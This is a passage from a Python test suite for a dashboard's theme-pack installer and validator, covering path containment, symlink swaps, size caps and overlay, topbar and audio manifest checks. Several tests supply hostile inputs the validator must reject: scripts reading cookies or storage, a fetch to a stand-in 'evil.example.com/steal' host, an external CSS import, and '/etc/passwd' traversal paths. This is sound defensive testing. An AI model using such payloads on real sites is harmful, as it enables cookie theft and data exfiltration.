    ) -> None:
        # On a case-insensitive filesystem (default macOS APFS),
        # Path.resolve() preserves the caller's spelling while PosixPath
        # comparison is case-sensitive: a source supplied as
        # themes/LCARS/subpack lexically misses dest themes/lcars even though
        # they are the same directory on disk. A lexical-only guard misses the
        # case variant and promotion deletes the source. The inode fallback
        # must catch it. Skipped where case spelling creates distinct paths.
        probe = tmp_path / "CaseProbe"
        probe.mkdir()
        if not (tmp_path / "caseprobe").exists():
            pytest.skip("requires a case-insensitive filesystem")
        import kiro_crew.dashboard.handlers.themes as th_mod
        import kiro_crew.dashboard.theme_validate as tv_mod

        monkeypatch.setattr(tv_mod, "config_dir", lambda: tmp_path / "cfg")
        themes_root = tv_mod._themes_dir()
        src = themes_root / "lcars" / "subpack"
        src.mkdir(parents=True)
        _write(
            src / "theme.json",
            {"slug": "lcars", "name": "LCARS", "emoji": "🖖", "level": 0, "formatVersion": 1},
        )
        _write(src / "variables.json", _VALID_VARS)
        sibling = themes_root / "lcars" / "unrelated-sibling.txt"
        sibling.write_text("precious", encoding="utf-8")
        case_variant = themes_root / "LCARS" / "subpack"

        theme, err, status = th_mod._do_install("local", {"path": str(case_variant)})

        assert theme is None and status == 400, (theme, err, status)
        assert err is not None and "inside the install destination" in err
        assert (src / "theme.json").is_file(), "install deleted its own source"
        assert sibling.is_file(), "install deleted an unrelated sibling"
        assert not any(p.name.startswith(".install-staging-") for p in themes_root.iterdir())

    def test_staging_walks_the_pinned_directory_by_its_kernel_spelling(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # The staging read compares each opened file's real path with the name
        # it was opened by. ``resolve()`` follows links but keeps the caller's
        # case, so on a case-insensitive filesystem a source typed as
        # ``themes/LCARS/pack`` for a directory stored as ``themes/lcars/pack``
        # is refused as unsafe before any later guard runs
        # (test_dest_case_variant_ancestor_rejected_on_case_insensitive_fs is
        # that case, on such a filesystem). The install must therefore walk the
        # source by the spelling the kernel reports for the pinned descriptor.
        # A case-sensitive filesystem cannot spell one directory two ways, so
        # the kernel's answer is stood in for by a second directory: the walk
        # must follow the answer, not the path the caller supplied.
        import kiro_crew.dashboard.handlers.themes as th_mod
        import kiro_crew.dashboard.theme_validate as tv_mod

        monkeypatch.setattr(tv_mod, "config_dir", lambda: tmp_path / "cfg")
        supplied = _make_theme(tmp_path / "typed")
        kernel = _make_theme(tmp_path / "on-disk", name="On Disk")
        pinned: list[int] = []

        def _fake_real_path(fd: int) -> str:
            pinned.append(fd)
            return str(kernel)

        monkeypatch.setattr(th_mod, "fd_real_path", _fake_real_path)

        walked: list[Path] = []
        real_copy = th_mod._copy_installed_theme

        def _spy(source: Path, dst: Path) -> None:
            walked.append(Path(source))
            real_copy(source, dst)

        monkeypatch.setattr(th_mod, "_copy_installed_theme", _spy)
        theme, err, status = th_mod._do_install("local", {"path": str(supplied)})
        assert err is None and status == 200 and theme is not None
        assert walked == [kernel]
        assert theme["name"] == "On Disk"
        # Asked about the descriptor pin_directory opened, not any pathname.
        assert len(pinned) == 1 and pinned[0] >= 0

    def test_themes_dir_containment_is_judged_on_the_pinned_spelling(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # The "source must not contain the themes directory" guard protects
        # the staging walk from copying its own output. It must judge the
        # spelling that walk uses -- the pinned descriptor's -- not the one the
        # caller supplied, or a source the kernel reports as the themes
        # directory itself would pass the guard and be walked.
        import kiro_crew.dashboard.handlers.themes as th_mod
        import kiro_crew.dashboard.theme_validate as tv_mod

        monkeypatch.setattr(tv_mod, "config_dir", lambda: tmp_path / "cfg")
        supplied = _make_theme(tmp_path)
        themes_root = tv_mod._themes_dir()
        themes_root.mkdir(parents=True, exist_ok=True)
        monkeypatch.setattr(th_mod, "fd_real_path", lambda fd: str(themes_root))

        theme, err, status = th_mod._do_install("local", {"path": str(supplied)})
        assert theme is None and status == 400, (theme, err, status)
        assert err is not None and "must not contain the themes directory" in err
        assert not any(p.name.startswith(".install-staging-") for p in themes_root.iterdir())

    def test_staging_keeps_the_caller_spelling_when_the_kernel_has_none(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # A host that cannot report the descriptor's path gives the install
        # nothing better than the caller's spelling; the read-side check on
        # every file still decides, so the install proceeds rather than
        # refusing every local source on such a host.
        import kiro_crew.dashboard.handlers.themes as th_mod
        import kiro_crew.dashboard.theme_validate as tv_mod

        monkeypatch.setattr(tv_mod, "config_dir", lambda: tmp_path / "cfg")
        src = _make_theme(tmp_path)
        monkeypatch.setattr(th_mod, "fd_real_path", lambda fd: None)

        walked: list[Path] = []
        real_copy = th_mod._copy_installed_theme

        def _spy(source: Path, dst: Path) -> None:
            walked.append(Path(source))
            real_copy(source, dst)

        monkeypatch.setattr(th_mod, "_copy_installed_theme", _spy)
        theme, err, status = th_mod._do_install("local", {"path": str(src)})
        assert err is None and status == 200 and theme is not None
        assert walked == [src]

    def test_install_validates_the_staging_snapshot_not_the_source(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # Validation must run on the private
        # staging copy (immutable to an attacker), NOT on the still-writable
        # source dir — otherwise content swapped in after validation gets
        # promoted unvalidated. Pin the order by capturing the path
        # _validate_theme_dir receives during a real _do_install.
        import kiro_crew.dashboard.handlers.themes as th_mod
        import kiro_crew.dashboard.theme_validate as tv_mod

        monkeypatch.setattr(tv_mod, "config_dir", lambda: tmp_path / "cfg")
        src = _make_theme(tmp_path)
        seen: list[Path] = []
        real_validate = th_mod._validate_theme_dir

        def _spy(path: Path, **kwargs):  # type: ignore[no-untyped-def]
            seen.append(Path(path))
            seen_kwargs.append(dict(kwargs))
            return real_validate(path, **kwargs)

        seen_kwargs: list[dict] = []
        monkeypatch.setattr(th_mod, "_validate_theme_dir", _spy)
        theme, err, status = th_mod._do_install("local", {"path": str(src)})
        assert err is None and status == 200 and theme is not None
        assert len(seen) == 1
        # Validated path is the staging snapshot inside the themes dir —
        # never the caller-supplied source.
        assert seen[0] != src
        assert seen[0].name.startswith(".install-staging-")
        # The install path must opt into the font-pin refusal; the read path is
        # the one that tolerates a legacy pin, so losing this flag here would
        # silently let a pinning pack install.
        assert seen_kwargs[0].get("installing") is True
        # The promoted install came from that snapshot.
        assert (tmp_path / "cfg" / "themes" / theme["slug"] / "theme.json").is_file()


class TestInstalledStore:
    def test_dir_under_config(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        import kiro_crew.dashboard.theme_validate as tv_mod

        monkeypatch.setattr(tv_mod, "config_dir", lambda: tmp_path)
        assert _installed_theme_dir("lcars") == tmp_path / "themes" / "lcars"

    def test_install_copy_and_remove_roundtrip(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import kiro_crew.dashboard.theme_validate as tv_mod

        monkeypatch.setattr(tv_mod, "config_dir", lambda: tmp_path)
        src = _make_theme(tmp_path)
        summary, err = _validate_theme_dir(src)
        assert err is None and summary is not None

        dest = _installed_theme_dir(summary["slug"])
        _copy_installed_theme(src, dest)
        assert (dest / "theme.json").is_file()
        assert dest.is_dir()

        # Remove de-registers (matches the DELETE handler's rmtree path).
        shutil.rmtree(dest)
        assert not dest.exists()

    def test_install_rejects_slug_colliding_with_editor_record(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # Duplicate-slug guard (now checked INSIDE the per-slug lock, right
        # before promotion): if an editor custom record <slug>.json already
        # exists, installing a dir with the same slug must 409 and leave no
        # staging residue — never both a .json record and a <slug>/ dir.
        import kiro_crew.dashboard.handlers.themes as th_mod
        import kiro_crew.dashboard.theme_validate as tv_mod

        monkeypatch.setattr(tv_mod, "config_dir", lambda: tmp_path)
        src = _make_theme(tmp_path)
        summary, err = _validate_theme_dir(src)
        assert err is None and summary is not None
        slug = summary["slug"]
        themes_dir = tmp_path / "themes"
        themes_dir.mkdir(parents=True, exist_ok=True)
        (themes_dir / f"{slug}.json").write_text("{}", encoding="utf-8")

        theme, err2, status = th_mod._do_install("local", {"path": str(src)})
        assert theme is None and status == 409
        assert "already exists" in (err2 or "")
        # No staging snapshot left behind, the editor record survives, and no
        # duplicate <slug>/ dir was promoted.
        assert list(themes_dir.glob(".install-staging-*")) == []
        assert (themes_dir / f"{slug}.json").is_file()
        assert not (themes_dir / slug).exists()


class TestValidateThemeDirL1:
    def test_valid_l1(self, tmp_path: Path) -> None:
        summary, err = _validate_theme_dir(_make_tiered(tmp_path, level=1, extra=_L1_ASSETS))
        assert err is None, err
        assert summary is not None
        assert summary["level"] == 1
        assert summary["slug"] == "pack-l1"

    def test_overrides_external_import_rejected(self, tmp_path: Path) -> None:
        assets = dict(_L1_ASSETS)
        assets["styles/overrides.css"] = "@import url('https://evil.example.com/x.css');"
        summary, err = _validate_theme_dir(_make_tiered(tmp_path, level=1, extra=assets))
        assert summary is None
        assert err is not None and "forbidden pattern" in err

    def test_overrides_forbidden_selector_rejected(self, tmp_path: Path) -> None:
        assets = dict(_L1_ASSETS)
        assets["styles/overrides.css"] = "iframe { display: none; }"
        summary, err = _validate_theme_dir(_make_tiered(tmp_path, level=1, extra=assets))
        assert summary is None
        assert err is not None and "forbidden selector" in err

    def test_too_many_fonts_rejected(self, tmp_path: Path) -> None:
        # Derived from the constant, not a literal: the cap covers both font roles
        # (a sans set plus a mono pair), so a literal drifts the moment it moves.
        assets = {
            f"styles/fonts/f{i}.woff2": b"wOF2" + b"\x00" * 8
            for i in range(_THEME_MAX_FONTS + 1)
        }
        summary, err = _validate_theme_dir(_make_tiered(tmp_path, level=1, extra=assets))
        assert summary is None
        assert err is not None and "too many fonts" in err

    def test_l1_asset_in_l0_theme_rejected(self, tmp_path: Path) -> None:
        # An L0 theme shipping a branding logo must be rejected on the level gate.
        d = _make_theme(tmp_path)
        (d / "branding").mkdir()
        (d / "branding" / "logo.svg").write_text("<svg></svg>", encoding="utf-8")
        summary, err = _validate_theme_dir(d)
        assert summary is None
        assert err is not None and "level 1" in err.lower()


class TestValidateThemeDirL2:
    def test_valid_l2(self, tmp_path: Path) -> None:
        summary, err = _validate_theme_dir(_make_tiered(tmp_path, level=2, extra=_L2_ASSETS))
        assert err is None, err
        assert summary is not None and summary["level"] == 2

    @pytest.mark.parametrize(
        "html",
        [
            "<script src='https://evil.example.com/x.js'></script>",
            "<div>x</div><script>document.cookie</script>",
            "<script>localStorage.getItem('k')</script>",
            "<script>fetch('https://evil.example.com/steal')</script>",
        ],
    )
    def test_overlay_html_denylist(self, tmp_path: Path, html: str) -> None:
        assets = dict(_L2_ASSETS)
        assets["overlays/scanner.html"] = html
        summary, err = _validate_theme_dir(_make_tiered(tmp_path, level=2, extra=assets))
        assert summary is None
        assert err is not None and "forbidden pattern" in err

    def test_too_many_overlays_rejected(self, tmp_path: Path) -> None:
        assets = {f"overlays/o{i}.html": "<div>x</div>" for i in range(6)}
        summary, err = _validate_theme_dir(_make_tiered(tmp_path, level=2, extra=assets))
        assert summary is None
        assert err is not None and "too many overlays" in err

    def test_persona_too_long_rejected(self, tmp_path: Path) -> None:
        assets = dict(_L2_ASSETS)
        assets["persona.md"] = "x" * 2001
        summary, err = _validate_theme_dir(_make_tiered(tmp_path, level=2, extra=assets))
        assert summary is None
        assert err is not None and "too long" in err

    def test_persona_missing_drop_clause_rejected(self, tmp_path: Path) -> None:
        assets = dict(_L2_ASSETS)
        assets["persona.md"] = "You are a cheerful assistant. Security overrides everything."
        summary, err = _validate_theme_dir(_make_tiered(tmp_path, level=2, extra=assets))
        assert summary is None
        assert err is not None and "drop" in err.lower()

    def test_persona_missing_security_clause_rejected(self, tmp_path: Path) -> None:
        assets = dict(_L2_ASSETS)
        assets["persona.md"] = "You are a pirate. Drop this persona whenever the user asks."
        summary, err = _validate_theme_dir(_make_tiered(tmp_path, level=2, extra=assets))
        assert summary is None
        assert err is not None and "override" in err.lower()

    def test_audio_bad_magic_rejected(self, tmp_path: Path) -> None:
        assets = dict(_L2_ASSETS)
        assets["audio/beep.mp3"] = b"NOTAUDIO" + b"\x00" * 16
        summary, err = _validate_theme_dir(_make_tiered(tmp_path, level=2, extra=assets))
        assert summary is None
        assert err is not None and "valid audio" in err


class TestLevelBounds:
    def test_l2_asset_in_l1_theme_rejected(self, tmp_path: Path) -> None:
        # An L1 theme carrying an overlays/ dir trips the directory level gate.
        assets = dict(_L1_ASSETS)
        assets["overlays/scanner.html"] = "<div>x</div>"
        summary, err = _validate_theme_dir(_make_tiered(tmp_path, level=1, extra=assets))
        assert summary is None
        assert err is not None and "level 2" in err.lower()

    def test_per_file_size_cap_rejected(self, tmp_path: Path) -> None:
        # overrides.css cap is 100 KiB; 101 KiB of inert text trips the size cap.
        assets = dict(_L1_ASSETS)
        assets["styles/overrides.css"] = "a" * (101 * 1024)
        summary, err = _validate_theme_dir(_make_tiered(tmp_path, level=1, extra=assets))
        assert summary is None
        assert err is not None and "too large" in err


class TestPureContentHelpers:
    @pytest.mark.parametrize(
        "head",
        [b"ID3\x04\x00\x00\x00", b"\xff\xfb\x90\x00", b"OggS\x00\x02", b"RIFF\x00\x00\x00\x00WAVE"],
    )
    def test_sniff_audio_accepts_known(self, head: bytes) -> None:
        assert _sniff_audio(head) is True

    @pytest.mark.parametrize("head", [b"", b"ab", b"NOTAUDIO", b"%PDF"])
    def test_sniff_audio_rejects_others(self, head: bytes) -> None:
        assert _sniff_audio(head) is False

    @pytest.mark.parametrize(
        "rel,category,min_level",
        [
            ("theme.json", "manifest", 0),
            ("variables.json", "variables", 0),
            ("styles/overrides.css", "overrides", 1),
            ("styles/fonts/x.woff2", "font", 1),
            ("branding/logo.svg", "logo", 1),
            ("overlays/scanner.html", "overlay", 2),
            ("topbar/dark.html", "topbar", 2),
            ("audio/beep.mp3", "audio", 2),
            ("audio/ambient.ogg", "audio_ambient", 2),
            ("persona.md", "persona", 2),
        ],
    )
    def test_classify_known(self, rel: str, category: str, min_level: int) -> None:
        assert _classify_theme_file(rel) == (category, min_level)

    @pytest.mark.parametrize("rel", ["evil.txt", "styles/x.js", "branding/logo.gif", "random/x"])
    def test_classify_unknown(self, rel: str) -> None:
        assert _classify_theme_file(rel) == (None, 0)

    def test_overrides_css_clean_ok(self) -> None:
        assert _validate_overrides_css(".chat { color: var(--accent); }") is None

    def test_overrides_css_expression_rejected(self) -> None:
        assert _validate_overrides_css("x { width: expression(alert(1)); }") is not None

    def test_overlay_html_clean_ok(self) -> None:
        assert _validate_overlay_html("<div>hi</div><style>.a{}</style>", "x.html") is None

    def test_overlay_html_cookie_rejected(self) -> None:
        assert _validate_overlay_html("<script>document.cookie</script>", "x.html") is not None

    def test_persona_valid_ok(self) -> None:
        assert _validate_persona(_VALID_PERSONA) is None


class TestResolveThemeAsset:
    def _install(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
        import kiro_crew.dashboard.theme_validate as tv_mod

        monkeypatch.setattr(tv_mod, "config_dir", lambda: tmp_path)
        theme = _installed_theme_dir("mytheme")
        (theme / "branding").mkdir(parents=True)
        (theme / "branding" / "logo.svg").write_text("<svg></svg>", encoding="utf-8")
        return theme

    def test_valid_asset_resolves(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        theme = self._install(tmp_path, monkeypatch)
        target, err = _resolve_theme_asset("mytheme", "branding/logo.svg")
        assert err is None
        assert target == (theme / "branding" / "logo.svg").resolve()

    @pytest.mark.parametrize("sub", ["../../../etc/passwd", "branding/../../escape", "/etc/passwd"])
    def test_traversal_rejected(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, sub: str
    ) -> None:
        self._install(tmp_path, monkeypatch)
        target, err = _resolve_theme_asset("mytheme", sub)
        assert target is None and err is not None

    def test_unsafe_slug_rejected(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        self._install(tmp_path, monkeypatch)
        target, err = _resolve_theme_asset("../evil", "branding/logo.svg")
        assert target is None and err is not None and "slug" in err

    def test_missing_file_not_found(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        self._install(tmp_path, monkeypatch)
        target, err = _resolve_theme_asset("mytheme", "branding/missing.svg")
        assert target is None and err == "not found"

    def test_symlink_rejected(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        theme = self._install(tmp_path, monkeypatch)
        outside = tmp_path / "secret.svg"
        outside.write_text("<svg/>", encoding="utf-8")
        try:
            (theme / "branding" / "link.svg").symlink_to(outside)
        except (OSError, NotImplementedError):
            pytest.skip("symlinks unsupported on this platform")
        target, err = _resolve_theme_asset("mytheme", "branding/link.svg")
        assert target is None and err is not None


class TestInstalledThemePersona:
    def _setup(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, text: str) -> None:
        import kiro_crew.config.loader as loader_mod

        monkeypatch.setattr(loader_mod, "config_dir", lambda: tmp_path)
        theme = tmp_path / "themes" / "mytheme"
        theme.mkdir(parents=True)
        (theme / "persona.md").write_text(text, encoding="utf-8")

    def test_reads_persona(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        from kiro_crew.dashboard.chat_utils import _installed_theme_persona

        self._setup(tmp_path, monkeypatch, _VALID_PERSONA)
        assert _installed_theme_persona("mytheme") == _VALID_PERSONA

    def test_caps_length(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        from kiro_crew.dashboard.chat_utils import _installed_theme_persona

        self._setup(tmp_path, monkeypatch, "y" * 5000)
        assert len(_installed_theme_persona("mytheme")) == 2000

    def test_bad_slug_returns_empty(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from kiro_crew.dashboard.chat_utils import _installed_theme_persona

        self._setup(tmp_path, monkeypatch, _VALID_PERSONA)
        assert _installed_theme_persona("../evil") == ""

    def test_missing_file_returns_empty(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import kiro_crew.config.loader as loader_mod
        from kiro_crew.dashboard.chat_utils import _installed_theme_persona

        monkeypatch.setattr(loader_mod, "config_dir", lambda: tmp_path)
        assert _installed_theme_persona("nosuchtheme") == ""


class TestCopyOverwrite:
    def test_reinstall_overwrites_same_name_file(self, tmp_path: Path) -> None:
        dst = tmp_path / "dst"
        # First install.
        _copy_installed_theme(_make_tiered(tmp_path / "a", level=1, extra=_L1_ASSETS), dst)
        assert (dst / "styles" / "overrides.css").read_text(encoding="utf-8") == ".chat-bubble { border-radius: 8px; }"
        # Re-install with changed content overwrites the same-name file.
        updated = dict(_L1_ASSETS)
        updated["styles/overrides.css"] = ".chat-bubble { border-radius: 2px; }"
        _copy_installed_theme(_make_tiered(tmp_path / "b", level=1, extra=updated), dst)
        assert (dst / "styles" / "overrides.css").read_text(encoding="utf-8") == ".chat-bubble { border-radius: 2px; }"

    def test_copies_all_l2_tiers(self, tmp_path: Path) -> None:
        dst = tmp_path / "dst"
        _copy_installed_theme(_make_tiered(tmp_path / "a", level=2, extra=_L2_ASSETS), dst)
        assert (dst / "overlays" / "scanner.html").is_file()
        assert (dst / "topbar" / "dark.html").is_file()
        assert (dst / "audio" / "beep.mp3").is_file()
        assert (dst / "persona.md").is_file()


class TestContentDenylistBranches:
    """Denylist branches the earlier suite left unasserted."""

    def test_overrides_javascript_rejected(self) -> None:
        assert _validate_overrides_css("a { background: javascript:alert(1); }") is not None

    def test_overlay_sessionstorage_rejected(self) -> None:
        assert _validate_overlay_html("<script>sessionStorage.getItem('k')</script>", "x.html") is not None

    def test_overlay_xhr_rejected(self) -> None:
        assert _validate_overlay_html("<script>new XMLHttpRequest()</script>", "x.html") is not None


class TestDoSCeilings:
    """Per-level entry-count and total-byte ceilings (caps monkeypatched small
    so a normal theme trips them deterministically without giant fixtures)."""

    def test_entry_count_ceiling(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        import kiro_crew.dashboard.theme_validate as tv_mod

        monkeypatch.setattr(tv_mod, "_THEME_ENTRIES_BY_LEVEL", {0: 1, 1: 1, 2: 1})
        summary, err = _validate_theme_dir(_make_theme(tmp_path))
        assert summary is None
        assert err is not None and "too many files" in err

    def test_total_bytes_ceiling(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        import kiro_crew.dashboard.theme_validate as tv_mod

        monkeypatch.setattr(tv_mod, "_THEME_TOTAL_BYTES_BY_LEVEL", {0: 10, 1: 10, 2: 10})
        summary, err = _validate_theme_dir(_make_theme(tmp_path))
        assert summary is None
        assert err is not None and "too large" in err


class TestFullL2Fixture:
    """A full Level-2 pack built in a tmp dir. Sample/test packs
    live OUTSIDE the repo — nothing theme-bearing ships in the wheel — so
    this fixture carries persona + overlays + topbar + a font + an audio
    manifest to exercise the §3.1/§3.3 overlay/topbar/audio manifest
    declarations and the content-bound persona descriptor end to end."""

    def test_full_l2_pack_validates(self, tmp_path: Path) -> None:
        summary, err = _validate_theme_dir(_make_full_l2(tmp_path))
        assert err is None, err
        assert summary is not None
        assert summary["level"] == 2
        assert summary["slug"] == "fixture-l2"

    def test_pack_has_persona(self, tmp_path: Path) -> None:
        pack = _make_full_l2(tmp_path)
        assert (pack / "persona.md").is_file()

    def test_descriptor_exposes_persona_info(self, tmp_path: Path) -> None:
        # The descriptor must surface persona sha256 + text so the frontend can
        # gate user consent on the exact persona content (content-bound consent).
        import hashlib

        pack = _make_full_l2(tmp_path)
        manifest = json.loads((pack / "theme.json").read_text(encoding="utf-8"))
        desc = _theme_asset_descriptor(pack, manifest, manifest["level"])
        text = (pack / "persona.md").read_text(encoding="utf-8", errors="replace")
        assert desc.get("hasPersona") is True
        info = desc.get("personaInfo")
        assert isinstance(info, dict)
        assert info["sha256"] == hashlib.sha256(text.encode("utf-8")).hexdigest()
        assert info["chars"] == len(text)
        assert info["text"] == text

    @requires_symlinks
    def test_descriptor_rejects_symlinked_persona(self, tmp_path: Path) -> None:
        # TOCTOU symlink-swap: persona.md replaced by a symlink to a file outside
        # the theme dir must NOT be read. The nolink chokepoint (O_NOFOLLOW +
        # fd-path containment) fails closed, so personaInfo is not surfaced (no
        # consent key -> persona never injected), while hasPersona stays True.
        pack = _make_full_l2(tmp_path)
        outside = tmp_path / "secret.md"
        outside.write_text(_VALID_PERSONA + "\nSECRET LEAK\n", encoding="utf-8")
        (pack / "persona.md").unlink()
        (pack / "persona.md").symlink_to(outside)
        manifest = json.loads((pack / "theme.json").read_text(encoding="utf-8"))
        desc = _theme_asset_descriptor(pack, manifest, manifest["level"])
        assert desc.get("hasPersona") is True
        assert desc.get("personaInfo") is None

    def test_pack_has_manifest_decls(self, tmp_path: Path) -> None:
        # The fixture carries overlay/topbar/audio declarations so it exercises
        # the §3.1/§3.3 machinery end to end.
        pack = _make_full_l2(tmp_path)
        manifest = json.loads((pack / "theme.json").read_text(encoding="utf-8"))
        assert isinstance(manifest.get("overlays"), list) and manifest["overlays"]
        assert isinstance(manifest.get("topbar"), dict)
        assert (pack / "audio" / "manifest.json").is_file()


# ── §3.1/§3.3 manifest declarations + §4.2 layout denylist + descriptor ──

# A pack-relative overlay/topbar HTML file set the resolvers can find on disk.
def _decl_pack(root: Path, files: dict[str, object] | None = None) -> Path:
    """Bare directory with the given rel-path files (str|bytes). Backs
    the manifest declaration validators, which resolve ``src`` against disk."""
    d = root / "decl-pack"
    d.mkdir(parents=True, exist_ok=True)
    for rel, content in (files or {}).items():
        p = d / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(content, bytes):
            p.write_bytes(content)
        else:
            p.write_text(str(content), encoding="utf-8")
    return d


# A fully-specified, valid overlay declaration (every optional field present).
_FULL_OVERLAY = {
    "id": "scanner",
    "src": "overlays/scanner.html",
    "position": "top-right",
    "zIndex": 42,
    "pointerEvents": False,
    "animation": "once",
    "trigger": "idle-30s",
}


class TestValidateOverlayDecls:
    """§3.1 theme.json ``overlays`` list validation (declarations are OPTIONAL)."""

    def _pack(self, tmp_path: Path) -> Path:
        return _decl_pack(
            tmp_path,
            {"overlays/scanner.html": "<div>x</div>", "overlays/other.html": "<div>y</div>"},
        )

    def test_valid_full_decl_passes(self, tmp_path: Path) -> None:
        assert _validate_overlay_decls({"overlays": [_FULL_OVERLAY]}, self._pack(tmp_path)) is None

    def test_no_overlays_key_backward_compat(self, tmp_path: Path) -> None:
        assert _validate_overlay_decls({}, self._pack(tmp_path)) is None

    def test_bad_id_rejected(self, tmp_path: Path) -> None:
        err = _validate_overlay_decls(
            {"overlays": [{"id": "Bad Id", "src": "overlays/scanner.html"}]}, self._pack(tmp_path)
        )
        assert err is not None and "id' must match" in err

    def test_id_not_equal_file_rejected(self, tmp_path: Path) -> None:
        # id must equal the src file stem so /overlay/{id} serves it.
        err = _validate_overlay_decls(
            {"overlays": [{"id": "scanner", "src": "overlays/other.html"}]}, self._pack(tmp_path)
        )
        assert err is not None and "must be overlays/scanner.html" in err

    def test_duplicate_id_rejected(self, tmp_path: Path) -> None:
        dup = {"id": "scanner", "src": "overlays/scanner.html"}
        err = _validate_overlay_decls({"overlays": [dup, dict(dup)]}, self._pack(tmp_path))
        assert err is not None and "duplicate overlay id" in err

    def test_too_many_overlays_rejected(self, tmp_path: Path) -> None:
        decls = [{"id": f"o{i}", "src": f"overlays/o{i}.html"} for i in range(6)]
        err = _validate_overlay_decls({"overlays": decls}, self._pack(tmp_path))
        assert err is not None and "too many overlay" in err

    def test_bad_position_rejected(self, tmp_path: Path) -> None:
        err = _validate_overlay_decls(
            {"overlays": [dict(_FULL_OVERLAY, position="diagonal")]}, self._pack(tmp_path)
        )
        assert err is not None and "invalid position" in err

    def test_zindex_over_max_rejected(self, tmp_path: Path) -> None:
        err = _validate_overlay_decls(
            {"overlays": [dict(_FULL_OVERLAY, zIndex=10000)]}, self._pack(tmp_path)
        )
        assert err is not None and "zIndex must be an int" in err

    def test_bad_trigger_rejected(self, tmp_path: Path) -> None:
        # idle-<N>s allows 1..3 digits; idle-9999s (4 digits) is invalid.
        err = _validate_overlay_decls(
            {"overlays": [dict(_FULL_OVERLAY, trigger="idle-9999s")]}, self._pack(tmp_path)
        )
        assert err is not None and "invalid trigger" in err

    def test_missing_src_file_rejected(self, tmp_path: Path) -> None:
        err = _validate_overlay_decls(
            {"overlays": [{"id": "ghost", "src": "overlays/ghost.html"}]}, self._pack(tmp_path)
        )
        assert err is not None and "missing file" in err


class TestValidateTopbarDecls:
    """§3.1 theme.json ``topbar`` object validation (declaration OPTIONAL)."""

    def _pack(self, tmp_path: Path) -> Path:
        return _decl_pack(
            tmp_path, {"topbar/dark.html": "<div>d</div>", "topbar/light.html": "<div>l</div>"}
        )

    def test_valid_topbar_passes(self, tmp_path: Path) -> None:
        tb = {
            "topbar": {
                "dark": "topbar/dark.html",
                "light": "topbar/light.html",
                "height": "56px",
                "hideOnMobile": True,
            }
        }
        assert _validate_topbar_decls(tb, self._pack(tmp_path)) is None

    @pytest.mark.parametrize("height", ["10vh", "-5px"])
    def test_bad_height_rejected(self, tmp_path: Path, height: str) -> None:
        err = _validate_topbar_decls({"topbar": {"height": height}}, self._pack(tmp_path))
        assert err is not None and "height' must match" in err

    @pytest.mark.parametrize("height", ["9999rem", "9999em", "201px", "500px"])
    def test_over_cap_height_rejected(self, tmp_path: Path, height: str) -> None:
        # Arbiter MEDIUM: syntactically valid but viewport-consuming heights
        # (e.g. 9999rem ≈ 160000px) must be rejected — a pointer-enabled topbar
        # iframe that size would cover/intercept the dashboard (UI redress),
        # the same containment class overrides.css already enforces.
        err = _validate_topbar_decls({"topbar": {"height": height}}, self._pack(tmp_path))
        assert err is not None and "px" in err

    @pytest.mark.parametrize("height", ["28px", "200px", "3rem", "2em"])
    def test_within_cap_height_accepted(self, tmp_path: Path, height: str) -> None:
        tb = {"topbar": {"dark": "topbar/dark.html", "light": "topbar/light.html",
                         "height": height}}
        assert _validate_topbar_decls(tb, self._pack(tmp_path)) is None

    def test_declared_dark_missing_file_rejected(self, tmp_path: Path) -> None:
        d = _decl_pack(tmp_path, {"topbar/light.html": "<div>l</div>"})  # no dark.html
        err = _validate_topbar_decls({"topbar": {"dark": "topbar/dark.html"}}, d)
        assert err is not None and "missing file" in err


# A minimal but valid MP3 header for audio-manifest fixtures (mirrors _VALID_MP3).
class TestValidateAudioManifest:
    """§3.3 audio/manifest.json validation (manifest file OPTIONAL)."""

    def _audio_pack(self, tmp_path: Path, manifest: dict, *, valid_audio: bool = True) -> Path:
        head = _VALID_MP3 if valid_audio else (b"NOTAUDIO" + b"\x00" * 16)
        return _decl_pack(
            tmp_path, {"audio/manifest.json": json.dumps(manifest), "audio/chime.mp3": head}
        )

    def test_valid_triggers_and_ambient_pass(self, tmp_path: Path) -> None:
        manifest = {
            "triggers": {"notification": {"src": "audio/chime.mp3", "volume": 0.5, "maxDuration": 2}},
            "ambient": {"src": "audio/chime.mp3", "volume": 0.3, "loop": True, "fadeIn": 1},
        }
        desc, err = _validate_audio_manifest(self._audio_pack(tmp_path, manifest))
        assert err is None
        assert desc is not None
        assert "notification" in desc["triggers"]
        assert desc["ambient"] is not None

    def test_unknown_trigger_rejected(self, tmp_path: Path) -> None:
        d = self._audio_pack(tmp_path, {"triggers": {"boop": {"src": "audio/chime.mp3"}}})
        desc, err = _validate_audio_manifest(d)
        assert desc is None and err is not None and "unknown audio trigger" in err

    def test_volume_over_one_rejected(self, tmp_path: Path) -> None:
        d = self._audio_pack(
            tmp_path, {"triggers": {"notification": {"src": "audio/chime.mp3", "volume": 1.5}}}
        )
        desc, err = _validate_audio_manifest(d)
        assert desc is None and err is not None and "volume must be a number 0..1" in err

    def test_max_duration_over_cap_rejected(self, tmp_path: Path) -> None:
        # message-sent's per-trigger cap is 1s; 2s exceeds it.
        d = self._audio_pack(
